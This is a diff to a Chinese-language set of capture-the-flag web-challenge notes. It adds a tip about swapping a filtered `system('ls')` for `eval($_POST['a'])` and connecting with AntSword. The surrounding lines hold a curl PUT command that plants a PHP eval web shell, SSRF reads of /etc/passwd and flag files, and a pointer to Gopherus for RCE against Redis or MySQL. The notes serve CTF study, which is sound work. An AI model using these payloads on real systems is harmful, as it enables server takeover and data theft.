@@ -582,6 +582,7 @@ while True:
 - 看到 PHP 返回内容是 HTTP Headers，可以联想到 %00截断
 - 如果服务器开放了 HTTP PUT 方法，可以使用  `curl -X PUT -d '<?php eval(@$_POST['a']); ?>' http://x/b.php` 注入 `b.php` 文件（如果没有任何安全设置，**'PUT请求用于更新资源，如果资源不存在，可能会创建新的资源'** 这个原则会写入文件到服务端【真实场景几乎不会遇到此漏洞】）
 - 培养目录提权思维，如果一道题本身禁止访问 /flag.php，可以通过参数构造地址的方法 (类似 127.0.0.1/flag.php) 来访问。curl_setopt() 函数就类似 Python 的 requests，可以访问外部或内部地址
+- 代码审计题中如果 `system('ls')` 注入不了[可能被过滤了]，可以试试 `eval($_POST["a"]);`，**善用蚁剑来连接**
 - SSRF
   - 常用套路 file:///etc/password ; file:///flag
   - 如果网站使用无密码 MySQL、Redis，可以考虑用 Gopherus 实现 RCE 注入
